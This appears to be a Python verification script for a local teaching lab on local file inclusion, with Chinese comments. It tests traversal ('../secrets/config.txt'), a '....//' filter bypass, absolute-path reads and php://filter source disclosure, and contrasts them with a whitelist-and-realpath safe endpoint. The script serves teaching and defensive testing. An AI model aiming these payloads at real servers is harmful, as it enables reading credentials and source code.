#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_lfllab.py — LFI 漏洞驗證
=============================================================================

 LFI 的驗證方式：**檢查回應中是否出現只有目標檔案才有的內容**。
 判定不是看「有沒有錯誤」，而是看「有沒有讀到不該讀的東西」。

 用法：
   python verify_lfllab.py 8950
=============================================================================
"""

import base64
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8950
BASE = "http://127.0.0.1:%d" % PORT
results = []


def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def main():
    print("=" * 76)
    print(" LfiLab 驗證 — 本機檔案包含")
    print(" 目標：%s" % BASE)
    print("=" * 76)

    st, _ = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        sys.exit(1)

    # ===== L1：基本路徑穿越 =====
    st1, b1 = get("/page?page=" + urllib.parse.quote("../secrets/config.txt", safe=""))
    hit1 = "FLAG{lfi_secret_file_read}" in b1
    ev = [
        "請求      : GET /page?page=../secrets/config.txt",
        "預期漏洞  : 讀到 pages/ 目錄之外的敏感檔案",
        "實際      : HTTP %s；讀到 config.txt = %s" % (st1, hit1),
        "內容證據  : %s" % ("DB_PASSWORD=..." if "DB_PASSWORD" in b1 else "(無)"),
        "根因      : 把使用者輸入直接串接成檔案路徑（無白名單、無路徑驗證）",
        "危害      : 讀取任意本機檔案 → 設定檔、金鑰、原始碼",
        "驗證方式  : 看回應是否含**只有目標檔案才有的內容**",
        "修補方向  : 白名單 + realpath 驗證（見 /safe）",
        "OWASP 對照: CWE-22（路徑穿越）/ CWE-98（檔案包含）",
    ]
    check("L1 基本路徑穿越", "CWE-22 / CWE-98", hit1, "\n".join(ev))

    # ===== L2：過濾 ../ 的繞過 =====
    # 程式把 ../ 取代為空，但 ....// → 取代後變成 ../
    payload2 = "....//secrets/config.txt"
    st2, b2 = get("/page-filtered?page=" + urllib.parse.quote(payload2, safe=""))
    hit2 = "FLAG{lfi_secret_file_read}" in b2
    ev = [
        "請求      : GET /page-filtered?page=%s" % payload2,
        "繞過原理  : /page-filtered 用 page.replace('../','') 過濾",
        "                    '....//' 經過取代後 → '../'（單次取代反而還原成危險路徑）",
        "預期漏洞  : 過濾被繞過，仍能讀到敏感檔案",
        "實際      : HTTP %s；讀到 = %s" % (st2, hit2),
        "內容證據  : %s" % ("FLAG{lfi_secret_file_read}" if hit2 else "(無)"),
        "            註：兩層 ....//....// 會變成 ../../ → 過頭，單層才正確",
        "根因      : **用字串取代實作過濾**（可被組合繞過）",
        "修補方向  : 不要用字串比對/取代做安全檢查；用白名單 + realpath",
        "OWASP 對照: CWE-22",
    ]
    check("L2 過濾 ../ 的繞過（....//）", "CWE-22", hit2, "\n".join(ev))

    # ===== L3：絕對路徑（L5 一併驗證）=====
    st3, b3 = get("/page?page=" + urllib.parse.quote("/secrets/config.txt", safe=""))
    hit3 = "FLAG{lfi_secret_file_read}" in b3
    st3b, b3b = get("/page?page=" + urllib.parse.quote("/secrets/passwd.txt", safe=""))
    hit3b = "FLAG{lfi_system_file_read}" in b3b
    ev = [
        "請求 1    : GET /page?page=/secrets/config.txt → HTTP %s；讀到=%s"
        % (st3, hit3),
        "請求 2    : GET /page?page=/secrets/passwd.txt → HTTP %s；讀到=%s"
        % (st3b, hit3b),
        "預期漏洞  : 絕對路徑可直接指定任意檔案",
        "精確度    : 不需要路徑穿越，直接給絕對路徑即可",
        "根因      : 未限制路徑必須位於允許的目錄內",
        "修補方向  : realpath 後檢查是否在允許目錄內（見 /safe）",
        "OWASP 對照: CWE-22",
    ]
    check("L3 絕對路徑讀取", "CWE-22", hit3 and hit3b, "\n".join(ev))

    # ===== L4：php://filter 讀原始碼 =====
    st4, b4 = get("/page?page=" + urllib.parse.quote(
        "php://filter/convert.base64-encode/resource=home.php", safe=""))
    b64 = re.search(r"<pre>([A-Za-z0-9+/=]{16,})</pre>", b4)
    decoded = ""
    if b64:
        try:
            decoded = base64.b64decode(b64.group(1)).decode("utf-8", "replace")
        except Exception:                                    # noqa: BLE001
            pass
    hit4 = "<?php" in decoded or "Welcome to Home" in decoded
    ev = [
        "請求      : GET /page?page=php://filter/convert.base64-encode/resource=home.php",
        "預期漏洞  : 讀出**原始碼**（而非執行結果）",
        "實際      : HTTP %s；base64 長度=%s；解碼後含 PHP 原始碼=%s"
        % (st4, len(b64.group(1)) if b64 else 0, hit4),
        "解碼片段  : %r" % decoded[:120],
        "根因      : 允許 php:// wrapper 直接作為檔案路徑",
        "危害      : 讀出原始碼 → 發現其他漏洞（金鑰、邏輯、SQL）",
        "修補方向  : 禁止使用者控制 wrapper（白名單副檔名 + realpath）",
        "OWASP 對照: CWE-98",
    ]
    check("L4 php://filter 讀原始碼", "CWE-98", hit4, "\n".join(ev))

    # ===== 安全對照 =====
    st_s1, b_s1 = get("/safe?page=" + urllib.parse.quote("../secrets/config.txt", safe=""))
    blocked1 = (st_s1 == 200 and "拒絕" in b_s1) or (st_s1 == 403)
    st_s2, b_s2 = get("/safe?page=home.php")
    normal_ok = (st_s2 == 200) and ("歡迎" in b_s2 or "Home" in b_s2 or "首頁" in b_s2)
    ev = [
        "請求 1    : GET /safe?page=../secrets/config.txt",
        "            → HTTP %s；被阻擋=%s" % (st_s1, blocked1),
        "請求 2    : GET /safe?page=home.php（正常）",
        "            → HTTP %s；仍可正常使用=%s" % (st_s2, normal_ok),
        "安全實作  : ① basename 取檔名 ② 白名單比對 ③ realpath 驗證",
        "教學意義  : **同一支程式，換一個檢查函式，行為完全不同**",
    ]
    check("安全對照：/safe 正確阻擋", "防護驗證",
          blocked1 and normal_ok, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-38s %-22s %s" % (name, cwe, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  LFI 的驗證特色：")
    print("    不是看『有沒有錯誤訊息』，而是看『有沒有讀到不該讀的東西』——")
    print("    檢查回應中是否出現**只有目標檔案才有的內容**（FLAG / 設定值 / 原始碼）。")
    print("=" * 76)

    with open("lfllab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "cwe": c, "present": p} for n, c, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 lfllab_result.json）")


if __name__ == "__main__":
    main()
